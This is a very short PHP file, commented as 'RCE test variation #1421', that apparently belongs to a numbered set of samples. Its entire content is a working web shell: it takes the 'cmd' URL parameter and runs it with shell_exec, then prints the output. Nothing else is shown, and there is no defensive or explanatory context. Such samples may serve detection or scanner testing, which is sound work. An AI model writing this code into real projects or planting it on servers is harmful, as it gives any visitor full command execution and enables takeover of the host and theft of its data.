<?php
// RCE test variation #1421
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>